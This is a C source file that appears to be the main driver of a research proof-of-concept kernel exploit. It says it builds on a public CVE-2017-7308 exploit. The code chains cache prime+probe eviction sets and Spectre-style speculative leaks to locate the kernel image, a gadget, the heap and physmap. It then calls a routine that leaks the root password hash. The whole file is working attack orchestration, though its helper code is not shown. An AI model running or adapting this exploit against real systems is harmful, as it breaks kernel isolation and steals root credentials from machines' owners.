#define _GNU_SOURCE

#include "envprep.h"
#include "memprep.h"
#include "memwrite.h"
#include "specex_utils.h"
#include "specex_leaks.h"
#include "llc_prime_probe.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>

#define USER_PAGE_SIZE (2ul*1024*1024) // 2MB

struct timespec total_exec_start;
void start_timer_total_exec() {
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
}

void stop_timer_total_exec() {
  struct timespec total_exec_finish;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);

  double total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  char mod[] = "\033[1;4;93m"; // bold;underline;high-intensity-yellow
  char nomod[] = "\033[00m";
  printf("\n%s[#] Total execution time of PoC: %.3f sec%s\n", mod, total_exec_elapsed, nomod);
}

void init_matrices();
int main(int argc, char **argv) {
	srand(time(NULL));

  printf("[#] This PoC exploit is a modified version of\n");
  printf("[#]  https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c\n");
  printf("[#] So you might recognize overlapping lines.\n");

	printf("\n[.] starting\n");
	start_timer_total_exec();

	setup_sandbox();

  set_cpu(MAIN_THREAD_CPU_ID);

  init_matrices();

  printf("\n[.] find LLC eviction sets..\n");
  printf("[.] using eviction set generation method: %s\n", PP_EVICSET_GEN_METHOD);
  pp_create_eviction_sets(PP_EVICSET_GEN_METHOD, LLC_SIZE_IN_MB, LLC_ASSOCIATIVITY);
  printf("[.] find LLC eviction sets.. DONE\n");

  prepare_memory_layout();
  find_necessary_items();
  free_unneeded_objects();

  init_specex_leaks();

  start_flag_eviction_in_co_thread();

  unsigned long kernel_base_address = find_kernel_image();

  unsigned long spectre_gadget_addr = find_spectre_gadget(kernel_base_address);

  unsigned long heap_base_address = find_heap_base_spectre(spectre_gadget_addr);

  unsigned long user_page = (unsigned long) mmap(NULL, USER_PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (user_page == (unsigned long) MAP_FAILED) {
    perror("mmap");
    exit(1);
  }
  memset((char*)user_page, 0x3c, USER_PAGE_SIZE);

  unsigned long physmap_addr = find_user_page_in_physmap(user_page, USER_PAGE_SIZE, heap_base_address, spectre_gadget_addr, kernel_base_address);

  leak_root_password_hash(spectre_gadget_addr, heap_base_address, user_page, physmap_addr);

  munmap((void*)user_page, USER_PAGE_SIZE);

  stop_timer_total_exec();

  // stop flag evicting thread
  stop_co_thread();

  pp_close();

  // make poc process sleep infinitely
  fflush(stdout);
  fflush(stderr);
	while (1) sleep(1000);

	return 0;
}
